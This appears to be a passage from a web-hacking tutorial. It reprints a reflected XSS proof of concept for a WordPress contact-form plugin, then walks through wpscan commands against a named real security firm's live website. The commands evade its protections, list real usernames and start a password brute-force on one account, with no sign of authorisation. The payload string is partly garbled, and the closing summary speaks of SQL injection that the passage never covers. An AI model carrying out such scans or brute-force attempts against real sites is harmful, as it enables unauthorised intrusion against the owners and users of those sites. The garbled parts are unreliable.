
# WordPress Custom Contact Forms Cross Site Scripting

Authored by: SINA Rabbani
Posted May 11, 2012

The WordPress Custom Contact Forms suffer from multiple cross site scripting vulnerabilities.

tags | exploit, vulnerability, xss
MD5 | a87fa4c3207c8d7cc65ddaabb2235922d
Download | Favorite | Comments (0)

## Related Files

## Share This

Like 0
Tweet
LinkedIn
Reddit
Digg
StumbleUpon

Change Mirror

Download

---BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

WordPress Security audit
Custom Contact Forms

1. Cross-site scripting (reflected)

1.1. http://127.0.0.1/wp-admin/options-general.php [name of an arbitrarily supplied request parameter]
1.2. http://127.0.0.1/wp-admin/options-general.php [name of an arbitrarily supplied request parameter]
1.3. http://127.0.0.1/wp-admin/options-general.php [x parameter]

### Issue background

Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application’s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request which, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user’s browser in the context of that user’s session with the application.

The attacker-supplied code can perform a wide variety of actions, such as stealing the victim’s session token or login credentials, performing arbitrary actions on the victim’s behalf, and logging their keystrokes.

This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application’s response.

```
/wp-admin/options-general.php?page=bb2_options&#x3C;SCRIPT&#x26XXS32;//#3C\SCRIPT//#6C4C\SCRIP/cdC#9><script>alert(1)</script>:#6abbb2ef55f5%3E
```

```
HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:11.0) Gecko/20100101 Firefox/11.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Cookie: wordpress_5c01e08f0f95f039102cbe8366c5c7f3=admin%7C1334178029%7C0cb3e6d7ebff4d014b08f8f399e7931d9;
bb2_scrummer = 1534008940-127.0.1;
PHPSESSID=dp0pohl4p21uuw57ek61pdbar76;
wordpress_test_cookie=WP+Cookie+check;
wp-settings-1=widgets_access%300f%82e6uploader%30127;wp-settings-time-1=1334005690;
wordpress_logged_in_5c01e08f0f95f039102cbe8366c5c7f3=admin%7C1334178029%7C0b90d09df0911bd2b367c018b9081811a
```

As you see above, www.packetstormsecurity.com first identified this cross-site scripting or XSS vulnerability in this Contact Form back in 2012, but apparently it is still not patched in 2019. If we were on the penetration testing team for this site, our next task would be to test whether this vulnerability actually exists by using the POC, or proof of concept, attack the security researcher outlines in this security alert, as seen below.

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_451_0.png)

### Insecure Information Security Firms

I always find it a bit amusing how many security firms do a poor job of securing their own websites. Most famously, in 2011, the widely-known and well-regarded US-based information security firm, HBGary, had its website hacked. HBGary had been attacking the loosely organized hacking group, Anonymous, when Anonymous decided to hack back. Thousands of documents and emails were released on the Web that were both embarrassing to the firm and its clients (many of the most powerful firms in the United States). I’m not sure how their clients felt, but I would be reluctant to pay someone to secure my information who can’t secure their own.

We may have a modern-day HBGary in our midst. The information security firm [www.cybrary.it](www.cybrary.it) has a website built on WordPress. Let’s see if their website is secure.

To scan cybrary.it, let’s use the standard command as we used above, but let’s add another option to enumerate the users. This option will attempt to identify the users with access to update and alter the site, essentially webmaster rights. This option is `--enumerate u` and we can simply append to our command, such as; `kali > wpscan -url [https://www.cybrary.it](https://www.cybrary.it) -enumerate u`

When the command is run, it returns an error that the site is NOT running WordPress. That’s curious, as I’m quite certain it is running WordPress.

Sometimes websites have load balancers and DoS protection technologies that limit these types of scans. Fortunately, wpscan has a stealthy mode that sometimes is capable of getting past these protections. Let’s try it by adding the option `–stealthy` at the end of our command.

```
kali > wpscan -url [https://www.cybrary.it](https://www.cybrary.it) -enumerate u -stealthy
```

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_453_0.png)

```
root@kali-2019:~# wpscan --url https://www.cybrary.it --enumerate u --stealthy
```

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_455_0.png)

```
WordPress Security Scanner by the WPScan Team
Version 3.4.3
Sponsored by Sucuri - https://sucuri.net
@_WPScan_, @ethicalhacker3r, @erwan_lr, @FireFart_

URL: https://www.cybrary.it/
Started: Mon Aug 12 14:28:44 2019

Interesting Finding(s):

https://www.cybrary.it/
Interesting Entries:
Server: nginx
via: 1.1 b7bdad6e794db75fcc11fe5733aa7ccc.cloudfront.net (CloudFront)
X-amz-cf-pop: DFW50-C
X-amz-cf-id: pzc2GRuRCIXH-BGXPTWvYLm9BYJFC9cvow_B0BwgVApqfxQwNoXhgp==
Found By: Headers (Passive Detection)
Confidence: 100%

https://www.cybrary.it/xmlrpc.php
Found By: Headers (Passive Detection)
Confidence: 80%
Confirmed By: Link Tag (Passive Detection), 30% confidence
References:
http://codex.wordpress.org/XML-RPC_Pingback_API
https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

WordPress version 4.7.5 identified (Insecure, released on 2017-05-16).
Detected By: Rss Generator (Passive Detection)
https://www.cybrary.it/feed/, <generator>https://wordpress.org/?v=4.7.5</generator>
https://www.cybrary.it/comments/feed/, <generator>https://wordpress.org/?v=4.7.5</generator>
https://www.cybrary.it/home/feed/, <generator>https://wordpress.org/?v=4.7.5</generator>

27 vulnerabilities identified:
```

```
[+] Enumerating Users

[i] User(s) Identified:

[+] lpark
    | Detected By: Rss Generator (Passive Detection)

[+] Tatianna
    | Detected By: Rss Generator (Passive Detection)

[+] angelawood
    | Detected By: Rss Generator (Passive Detection)

[+] thorlacher2322
    | Detected By: Rss Generator (Passive Detection)
```

As you can see, our scan was able to get past their protections and found twenty-seven vulnerabilities!

Furthermore, it was able to detect several users on the system.

Additionally, wpscan has a brute-force password cracking capability for WordPress sites once the users are identified. This brute-force capability actually bypasses the form (thereby evading some brute-force protection mechanisms) and sends the potential passwords directly to the exposed portion of the website that feeds the passwords back for authentication (xmlrpc). To use the brute force capabilities of his tool, you need to use the `-U` option, followed by the **username**, and the `-P` option followed by the **password list** you want to use.

```text
root@kali:~$ wpscan --url https://www.cybrary.it --stealthy -U lpark -P /root/top1000passwords

  _  _____   
 | |/ ____| | |
 | | |  _| | |_
 | | |___| | /\
 |_|_____| |_/

  WordPress Security Scanner by the WPScan Team
  Version 3.4.3
  Sponsored by Sucuri - https://sucuri.net
  @WPScan_, @ethicalhack3r, @erwan_lr, @FireFart

[+] URL: https://www.cybrary.it/
[+] Started: Thu Aug 15 16:40:53 2019

[i] No Config Backups Found.

[+] Performing password attack on WP Login against 1 user/s
Brute 1park / master  Time: 00:00:19 >> (107 / 1000) 10.70% ETA: 00:02:39
```

In this case, let’s try to brute force the user **lpark** and use our top1000passwords list such as: `kali > wpscan –url https://www.cybrary.it –stealthy –U lpark –P /root/top1000passwords` After scanning through and listing the vulnerabilities again, wpscan will begin to attempt to brute force that user.

# **Summary**

Web hacking is among the most important risks to the incredible applications and infrastructure that comprise the World Wide Web. There are almost innumerable ways to hack the apps and infrastructure of the Web, and the approach you take will depend upon multiple factors including; the technologies employed by the website, the Web server, or the user.

SQL Injection is one of the most pernicious attacks against websites and certainly the one responsible for the greatest financial losses. Here we were able to fingerprint the database and extract key information using the sqlmap application.
